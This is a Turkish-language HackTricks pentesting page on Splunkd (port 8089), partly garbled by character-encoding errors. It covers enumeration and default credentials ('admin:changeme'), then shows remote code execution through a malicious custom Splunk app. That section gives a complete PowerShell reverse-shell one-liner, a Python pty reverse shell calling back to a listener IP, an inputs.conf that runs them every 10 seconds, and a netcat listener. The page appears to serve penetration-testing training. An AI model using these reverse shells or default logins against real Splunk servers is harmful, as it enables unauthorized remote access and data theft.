# 8089 - Splunkd Pentest

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramana Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**]'na(https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**]'yi(https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**]'i(https://opensea.io/collection/the-peass-family) iÃ§eren koleksiyonumuz
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

## **Temel Bilgiler**

Splunk, **veri toplama, analiz etme ve gÃ¶rselleÅŸtirme**de Ã¶nemli bir rol oynayan bir **gÃ¼nlÃ¼k analiz aracÄ±dÄ±r**. Ä°lk amacÄ± **SIEM (GÃ¼venlik Bilgi ve Olay YÃ¶netimi)** aracÄ± olarak hizmet vermek olmasa da, **gÃ¼venlik izleme** ve **iÅŸ analitiÄŸi** alanÄ±nda popÃ¼lerlik kazanmÄ±ÅŸtÄ±r.

Splunk daÄŸÄ±tÄ±mlarÄ± genellikle **duyarlÄ± verileri** depolamak iÃ§in kullanÄ±lÄ±r ve sistem ele geÃ§irilirse potansiyel saldÄ±rganlar iÃ§in **deÄŸerli bir bilgi kaynaÄŸÄ±** olabilir. **VarsayÄ±lan port:** 8089
```
PORT     STATE SERVICE VERSION
8089/tcp open  http    Splunkd httpd
```
{% hint style="info" %}
**Splunk web sunucusu varsayÄ±lan olarak 8000 numaralÄ± portta Ã§alÄ±ÅŸÄ±r**.
{% endhint %}

## NumaralandÄ±rma

### Ãœcretsiz SÃ¼rÃ¼m

Splunk Enterprise deneme sÃ¼rÃ¼mÃ¼, **60 gÃ¼n sonra Ã¼cretsiz bir sÃ¼rÃ¼me dÃ¶nÃ¼ÅŸÃ¼r**, bu sÃ¼rÃ¼m **kimlik doÄŸrulamasÄ± gerektirmez**. Sistem yÃ¶neticilerinin Splunk'Ä± denemek iÃ§in deneme sÃ¼rÃ¼mÃ¼nÃ¼ yÃ¼klemesi ve daha sonra unutmasÄ± oldukÃ§a yaygÄ±ndÄ±r. Bu otomatik olarak kimlik doÄŸrulamasÄ± olmayan Ã¼cretsiz sÃ¼rÃ¼me dÃ¶nÃ¼ÅŸecektir ve bu da Ã§evrede bir gÃ¼venlik aÃ§Ä±ÄŸÄ± oluÅŸturacaktÄ±r. BazÄ± organizasyonlar bÃ¼tÃ§e kÄ±sÄ±tlamalarÄ± nedeniyle Ã¼cretsiz sÃ¼rÃ¼mÃ¼ tercih edebilir, ancak kullanÄ±cÄ±/rol yÃ¶netiminin olmamasÄ±nÄ±n sonuÃ§larÄ±nÄ± tam olarak anlamayabilirler.

### VarsayÄ±lan Kimlik Bilgileri

Eski Splunk sÃ¼rÃ¼mlerinde, varsayÄ±lan kimlik bilgileri **`admin:changeme`** ÅŸeklindedir ve giriÅŸ sayfasÄ±nda kolayca gÃ¶rÃ¼ntÃ¼lenir.\
Ancak, **en son Splunk sÃ¼rÃ¼mÃ¼** kurulum sÃ¼recinde **kimlik bilgilerini ayarlar**. VarsayÄ±lan kimlik bilgileri Ã§alÄ±ÅŸmÄ±yorsa, `admin`, `Welcome`, `Welcome1`, `Password123` gibi yaygÄ±n zayÄ±f ÅŸifreler iÃ§in kontrol etmeye deÄŸer.

### Bilgi Edinme

Splunk'a giriÅŸ yaptÄ±ktan sonra, verileri **inceleyebilir**, **raporlar Ã§alÄ±ÅŸtÄ±rabilir**, **panolar oluÅŸturabilir**, Splunkbase kÃ¼tÃ¼phanesinden **uygulamalar yÃ¼kleyebilir** ve Ã¶zel uygulamalar yÃ¼kleyebilirsiniz.\
AyrÄ±ca kod Ã§alÄ±ÅŸtÄ±rabilirsiniz: Splunk'Ä±n **kod Ã§alÄ±ÅŸtÄ±rma** iÃ§in birden fazla yÃ¶ntemi vardÄ±r, Ã¶rneÄŸin sunucu tarafÄ± Django uygulamalarÄ±, REST uÃ§ noktalarÄ±, betikli giriÅŸler ve uyarÄ± betikleri. Splunk sunucusunda uzaktan kod yÃ¼rÃ¼tmenin yaygÄ±n bir yÃ¶ntemi, betikli giriÅŸ kullanÄ±mÄ±yla gerÃ§ekleÅŸtirilir.

AyrÄ±ca, Splunk Windows veya Linux ana bilgisayarlarÄ±na yÃ¼klenebileceÄŸinden, betikli giriÅŸler Bash, PowerShell veya Batch betiklerini Ã§alÄ±ÅŸtÄ±rmak iÃ§in oluÅŸturulabilir.

### Shodan

* `Splunk derlemesi`

## Uzaktan Kod YÃ¼rÃ¼tme (RCE)

### Ã–zel Uygulama OluÅŸturma

Ã–zel bir uygulama **Python, Batch, Bash veya PowerShell betikleri** Ã§alÄ±ÅŸtÄ±rabilir.\
**Splunk'Ä±n Python yÃ¼klÃ¼ olarak geldiÄŸini** unutmayÄ±n, bu nedenle **Windows** sistemlerinde bile python kodu Ã§alÄ±ÅŸtÄ±rabilirsiniz.

Bize yardÄ±mcÄ± olmasÄ± iÃ§in [**bu**](https://github.com/0xjpuff/reverse\_shell\_splunk) Splunk paketini kullanabilirsiniz. Bu depodaki **`bin`** dizininde [Python](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/rev.py) ve [PowerShell](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/run.ps1) iÃ§in Ã¶rnekler bulunmaktadÄ±r. Bu adÄ±mlarÄ± adÄ±m adÄ±m takip edelim.

Bunu baÅŸarmak iÃ§in Ã¶ncelikle aÅŸaÄŸÄ±daki dizin yapÄ±sÄ±nÄ± kullanarak Ã¶zel bir Splunk uygulamasÄ± oluÅŸturmamÄ±z gerekmektedir:
```shell-session
tree splunk_shell/

splunk_shell/
â”œâ”€â”€ bin
â””â”€â”€ default
```
**`bin`** dizini, Ã§alÄ±ÅŸtÄ±rmayÄ± amaÃ§ladÄ±ÄŸÄ±mÄ±z **komut dosyalarÄ±nÄ±** iÃ§erecektir (bu durumda bir **PowerShell** ters kabuk), ve varsayÄ±lan dizinde `inputs.conf` dosyamÄ±z olacaktÄ±r. Ters kabuÄŸumuz bir **PowerShell tek satÄ±rlÄ±k komutu** olacaktÄ±r:
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close(
```
Dosya [inputs.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf), Splunk'a **hangi betiÄŸi Ã§alÄ±ÅŸtÄ±racaÄŸÄ±nÄ±** ve diÄŸer koÅŸullarÄ± sÃ¶yler. Burada uygulamayÄ± etkinleÅŸtiriyoruz ve Splunk'a betiÄŸi her 10 saniyede bir Ã§alÄ±ÅŸtÄ±rmasÄ±nÄ± sÃ¶ylÃ¼yoruz. AralÄ±k her zaman saniye cinsinden belirtilir ve bu ayar mevcut olduÄŸunda giriÅŸ (betik) yalnÄ±zca o zaman Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r.
```shell-session
cat inputs.conf

[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```
Uygulama daÄŸÄ±tÄ±ldÄ±ÄŸÄ±nda Ã§alÄ±ÅŸacak ve PowerShell tek satÄ±rlÄ±ÄŸÄ±nÄ± yÃ¼rÃ¼tecek olan `.bat` dosyasÄ±na ihtiyacÄ±mÄ±z var.

Bir sonraki adÄ±m, `Dosyadan uygulama yÃ¼kle`'yi seÃ§mek ve uygulamayÄ± yÃ¼klemektir.

<figure><img src="../.gitbook/assets/image (665).png" alt=""><figcaption></figcaption></figure>

ZararlÄ± Ã¶zel uygulamayÄ± yÃ¼klemeden Ã¶nce, Netcat veya [socat](https://linux.die.net/man/1/socat) kullanarak bir dinleyici baÅŸlatalÄ±m.
```shell-session
sudo nc -lnvp 443

listening on [any] 443 ...
```
`Uygulama YÃ¼kle` sayfasÄ±nda `GÃ¶z at`a tÄ±klayÄ±n, daha Ã¶nce oluÅŸturduÄŸumuz tarball'Ä± seÃ§in ve `YÃ¼kle`'ye tÄ±klayÄ±n. UygulamayÄ± yÃ¼klediÄŸimiz anda, uygulamanÄ±n durumu otomatik olarak `Etkin` olarak deÄŸiÅŸtirileceÄŸinden **ters kabuk** alÄ±nÄ±r.

#### Linux

EÄŸer bir **Linux ana bilgisayarla uÄŸraÅŸÄ±yorsak**, Ã¶zel kÃ¶tÃ¼ amaÃ§lÄ± uygulamayÄ± oluÅŸturmadan Ã¶nce `rev.py` Python betiÄŸini **dÃ¼zenlememiz gerekir**. Geri kalan sÃ¼reÃ§ aynÄ± olacaktÄ± ve Netcat dinleyicimizde ters kabuk baÄŸlantÄ±sÄ± alacak ve yarÄ±ÅŸa baÅŸlayacaktÄ±k.
```python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```
### Uzaktan Kod Ã‡alÄ±ÅŸtÄ±rma ve Yetki YÃ¼kseltme

AÅŸaÄŸÄ±daki sayfada, bu servisin nasÄ±l kÃ¶tÃ¼ye kullanÄ±larak yetki yÃ¼kseltme ve kalÄ±cÄ±lÄ±k elde edilebileceÄŸine dair bir aÃ§Ä±klama bulabilirsiniz:

{% content-ref url="../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md" %}
[splunk-lpe-and-persistence.md](../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md)
{% endcontent-ref %}

## Referanslar

* [https://academy.hackthebox.com/module/113/section/1213](https://academy.hackthebox.com/module/113/section/1213)

<details>

<summary><strong>SÄ±fÄ±rdan Kahraman'a AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**]'na gÃ¶z atÄ±n (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'ler gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
